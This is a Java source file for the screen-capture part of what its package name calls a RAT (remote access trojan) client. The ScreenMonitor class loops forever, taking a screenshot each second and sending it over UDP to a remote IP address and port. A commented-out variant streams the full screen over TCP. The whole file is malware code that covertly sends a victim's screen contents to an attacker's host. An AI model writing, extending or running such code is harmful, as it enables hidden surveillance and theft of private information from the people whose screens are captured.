package rat_client;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.Socket;
import javax.imageio.ImageIO;

public class ScreenMonitor
{
    private String ip_address;
    private int port;
    private BufferedImage backup;

    public ScreenMonitor(String ip_address,int port)
    {
        this.ip_address=ip_address;
        this.port=port;
        shareScreenStream();
    }
    
    private void shareScreenStream()
    {
        try
        {
            DatagramSocket serverSocket = new DatagramSocket();
            byte[] receiveData = new byte[1024];
            byte[] sendData = new byte[1024];
            while(true)
            {
                  Rectangle r=new Rectangle(new Dimension(800,400));
                  BufferedImage image=new Robot().createScreenCapture(r);
                  ByteArrayOutputStream baos=new ByteArrayOutputStream();
                  ImageIO.write(image,"png",baos);
                  baos.flush();
                  byte[] imageInByte=baos.toByteArray();
                  System.out.println(imageInByte.length);
                  InetAddress IPaddress=InetAddress.getByName(ip_address);
                  DatagramPacket sendPacket=new DatagramPacket(imageInByte,imageInByte.length,IPaddress,port);
                  serverSocket.send(sendPacket);
                  System.out.println("Should be sent...");
                  Thread.sleep(1000);
            }
            /*ObjectOutputStream oos=new ObjectOutputStream(socket.getOutputStream());
            while(true)
            {
                Rectangle r=new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                BufferedImage image=new Robot().createScreenCapture(r);
                ByteArrayOutputStream baos=new ByteArrayOutputStream();
                ImageIO.write(image,"png",baos);
                baos.flush();
                byte[] imageInByte=baos.toByteArray();
                baos.close();
                oos.writeObject(imageInByte);
                oos.flush();
                System.out.println("Screen updated with "+imageInByte.length+" bytes");
                backup=image;
                Thread.sleep(1000);
            }*/
        }
        catch(IOException exc)
        {
            exc.printStackTrace();
        }
        catch(AWTException exc)
        {
            exc.printStackTrace();
        }
        catch(InterruptedException exc)
        {
            exc.printStackTrace();
        }
    }

}
